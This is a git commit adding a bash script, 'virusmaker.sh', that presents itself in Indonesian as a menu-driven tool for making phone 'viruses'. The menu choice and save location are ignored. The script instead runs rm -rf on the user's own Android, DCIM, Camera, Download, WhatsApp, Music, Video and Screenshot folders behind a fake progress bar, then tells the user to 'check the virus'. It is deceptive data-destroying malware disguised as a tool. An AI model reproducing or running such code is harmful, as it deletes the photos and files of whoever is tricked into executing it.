b729333d81d541cdbe56c4113942f93367679b7d
mrlitee <56295273+mrlitee@users.noreply.github.com>
2019-10-08 15:50:37 +0700

    Add files via upload

---
+++ virusmaker.sh
@@ -0,0 +1,54 @@
+#!bin/bash
+apt install ruby
+gem install lolcat
+apt install figlet
+yum install figlet
+clear
+figlet "VirusMaker" | lolcat ;
+sleep 2
+echo "*====================================*" | lolcat ;  
+echo "=          Tools VirusMaker          =" | lolcat ;            					       
+echo "=             By Mr.Lite             =" | lolcat ;
+echo "=            InCrustWeRush           =" | lolcat ;
+echo "*====================================*" | lolcat ;
+sleep 1
+echo
+echo "Daftar Virus :" | lolcat ;
+sleep 1
+echo
+echo "{1} Virus WhatsApp" | lolcat ;
+echo
+echo "{2} Bootloop"	| lolcat ;
+echo
+echo "{3} Hapus Data"   | lolcat ;
+echo
+sleep 2
+read -p "Silahkan Pilih Nomor :" Pilih ;
+sleep 2
+read -p "Dimana Anda Ingin Menyimpan :" Pilih ;
+ echo
+clear
+
+echo "Mohon Tunggu Atuh ../\.." | lolcat ;
+rm -rf Android
+echo "<<----------             >  10%" | lolcat ;
+rm -rf data
+rm -rf Camera
+echo "<<----------             >  25%" | lolcat ;
+rm -rf Download
+rm -rf DCIM
+echo "<<----------             >  50%" | lolcat ;
+rm -rf Picture
+rm -rf Video
+rm -rf Vidio
+echo "<<----------             >  75%" | lolcat ;
+rm -rf WhatsApp
+rm -rf Music
+echo "<<----------             >  85%" | lolcat ;
+rm -rf Musik
+rm -rf Kamera
+echo "<<----------             >  95%" | lolcat ;
+rm -rf Screenshot
+echo "<<----------             >  100%" | lolcat;
+echo
+echo "Done, Silahkan cek virusnya" | lolcat ;
